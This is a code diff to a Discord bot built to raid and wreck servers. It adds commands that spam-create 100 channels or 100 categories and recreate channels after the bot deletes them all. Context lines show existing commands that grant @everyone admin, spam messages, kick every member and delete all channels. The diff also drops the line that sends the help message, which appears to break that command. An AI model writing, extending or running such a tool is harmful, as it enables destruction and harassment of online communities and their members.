@@ -56,9 +56,9 @@ async def cmds(ctx):
  embed.add_field(name="purge <amount>", value="Purges messages.", inline=False)
  embed.add_field(name="admin",value="Gives @everyone admin.", inline=False)
  embed.add_field(name="ping",value="Shows bots ping.", inline=False)
+ embed.add_field(name="cate",value="Spam creates categorys.", inline=False)
+ embed.add_field(name="chancust <channel names>",value="Creates channel names of your choice.", inline=False)
 
-
- await ctx.send(embed=embed)
 
 @bot.command(pass_context=True)
 async def nick(ctx, rename_to):
@@ -160,6 +160,13 @@ async def spam(ctx, amount=1000000):
               await channel.send(random.choice(MESSAGE_CONTENTS))      
 
 @bot.command(pass_context=True)
+async def customchannel(ctx, *, name, amount=100):
+    await ctx.message.delete()
+    guild = ctx.message.guild
+    for i in range(amount):
+        await guild.create_text_channel(name)
+
+@bot.command(pass_context=True)
 async def kick(ctx):
         await ctx.message.delete()
         for user in list(ctx.guild.members):
@@ -212,6 +219,12 @@ async def userinfo(ctx, member: discord.Member):
 
   await ctx.send(embed=embed)
 
+@bot.command(pass_context=True)
+async def cate(ctx, amount=100):
+    await ctx.message.delete()
+    guild = ctx.message.guild 
+    for i in range(amount):
+        await guild.create_category(random.choice(CHANNEL_NAMES))
 
 @bot.command(pass_context=True)
 async def delete(ctx):
@@ -219,6 +232,8 @@ async def delete(ctx):
   for channel in ctx.guild.channels:
     print(f"Deleting channel {channel.name}")
     await channel.delete()
+  await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
+  await ctx.guild.create_voice_channel(random.choice(CHANNEL_NAMES))
 
 @bot.command(pass_context=True)
 async def channels(ctx, amount=500):
